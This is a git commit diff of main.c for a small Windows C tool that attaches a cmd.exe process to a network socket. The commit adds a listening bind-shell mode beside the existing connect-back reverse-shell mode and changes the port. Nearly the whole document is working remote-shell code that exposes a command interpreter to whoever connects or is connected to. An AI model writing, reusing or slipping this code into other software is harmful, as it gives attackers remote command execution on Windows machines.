e5308b8bb2b637d3d471596233541eda38c38149
brenw0rth <brenw0rth.dev@gmail.com>
2023-06-24 21:41:06 +0100

    refactor

--- main.c
+++ main.c
@@ -6,7 +6,7 @@
 #pragma comment(lib, "ws2_32.lib")
 
 #define SERVER "127.0.0.1"
-#define PORT 1234
+#define PORT 8000
 
 char* USAGE =
     "Starts a new instance of the windows command interpreter over a socket connection.\n"
@@ -19,16 +19,9 @@ char* USAGE =
     "See CMD /? for more options.";
 
 
-SOCKET ListenForClient()
-{
-    return INVALID_SOCKET;
-}
-
-SOCKET ConnectToServer()
-{
+static SOCKET CreateSocket() {
     WSADATA wsaData;
-    SOCKET clientSocket;
-    struct sockaddr_in serverAddress;
+    SOCKET sock;
     LPWSAPROTOCOL_INFO protocolInfo = NULL;
 
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -36,18 +29,65 @@ SOCKET ConnectToServer()
         return INVALID_SOCKET;
     }
 
-    clientSocket = WSASocket(AF_INET, SOCK_STREAM, 0, protocolInfo, 0, 0);
-    if (clientSocket == INVALID_SOCKET) {
-        printf("Failed to create socket.\n");
+    sock = WSASocket(AF_INET, SOCK_STREAM, 0, protocolInfo, 0, 0);
+    if (sock == INVALID_SOCKET) {
+        printf("Failed to create socket\n");
         WSACleanup();
         return INVALID_SOCKET;
     }
 
-    serverAddress.sin_family = AF_INET;
-    serverAddress.sin_addr.s_addr = inet_addr(SERVER);
-    serverAddress.sin_port = htons(PORT);
+    return sock;
+}
 
-    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
+
+SOCKET ListenForClient() {
+    SOCKET serverSocket, clientSocket;
+    struct sockaddr_in serverAddr, clientAddr;
+    int clientAddrLen = sizeof(clientAddr);
+
+    serverSocket = CreateSocket();
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = inet_addr(SERVER);
+    serverAddr.sin_port = htons(PORT);
+
+    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        printf("Failed to bind socket\n");
+        closesocket(serverSocket);
+        WSACleanup();
+        return INVALID_SOCKET;
+    }
+
+    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
+        printf("Failed to listen on socket\n");
+        closesocket(serverSocket);
+        WSACleanup();
+        return INVALID_SOCKET;
+    }
+
+    printf("Listening...\n");
+
+    clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
+    if (clientSocket == INVALID_SOCKET) {
+        printf("Failed to accept connection\n");
+        closesocket(serverSocket);
+        WSACleanup();
+        return INVALID_SOCKET;
+    }
+
+    closesocket(serverSocket);
+    return clientSocket;
+}
+
+SOCKET ConnectToServer() {
+    SOCKET clientSocket;
+    struct sockaddr_in serverAddr;
+
+    clientSocket = CreateSocket();
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = inet_addr(SERVER);
+    serverAddr.sin_port = htons(PORT);
+
+    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
         printf("Failed to connect to the server.\n");
         closesocket(clientSocket);
         WSACleanup();
@@ -57,19 +97,15 @@ SOCKET ConnectToServer()
     return clientSocket;
 }
 
-int main(int argc, char* argv[])
-{
+int main(int argc, char* argv[]) {
     STARTUPINFOA startupInfo;
     PROCESS_INFORMATION processInfo;
-    SOCKET clientSocket;
+    SOCKET sock;
     int listen = 0;
 
-    for (int i = 1; i < argc; i++)
-    {
-        if (argv[i][0] == '/')
-        {
-            switch (argv[i][1])
-            {
+    for (int i = 1; i < argc; i++) {
+        if (argv[i][0] == '/') {
+            switch (argv[i][1]) {
                 case '?':
                     printf("%s\n", USAGE);
                     return 0;
@@ -82,33 +118,23 @@ int main(int argc, char* argv[])
     }
 
     if (listen)
-    {
-        socket = ListenForClient();
-        if (socket == INVALID_SOCKET)
-        {
-            return 1;
-        }
-    }
+        sock = ListenForClient();
     else
-    {
-        clientSocket = ConnectToServer();
-        if (clientSocket == INVALID_SOCKET)
-        {
-            return 1;
-        }
-    }
+        sock = ConnectToServer();
+
+    if (sock == INVALID_SOCKET)
+        return 1;
 
     ZeroMemory(&startupInfo, sizeof(startupInfo));
     startupInfo.cb = sizeof(startupInfo);
     startupInfo.dwFlags = STARTF_USESTDHANDLES;
-    startupInfo.hStdInput = (HANDLE)clientSocket;
-    startupInfo.hStdOutput = (HANDLE)clientSocket;
-    startupInfo.hStdError = (HANDLE)clientSocket;
+    startupInfo.hStdInput = (HANDLE)sock;
+    startupInfo.hStdOutput = (HANDLE)sock;
+    startupInfo.hStdError = (HANDLE)sock;
 
-    if (!CreateProcessA(NULL, "cmd.exe /q", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo))
-    {
+    if (!CreateProcessA(NULL, "cmd.exe /q", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) {
         printf("Failed to create cmd.exe process.\n");
-        closesocket(clientSocket);
+        closesocket(sock);
         WSACleanup();
         return 1;
     }
@@ -117,7 +143,7 @@ int main(int argc, char* argv[])
 
     CloseHandle(processInfo.hProcess);
     CloseHandle(processInfo.hThread);
-    closesocket(clientSocket);
+    closesocket(sock);
     WSACleanup();
 
     return 0;
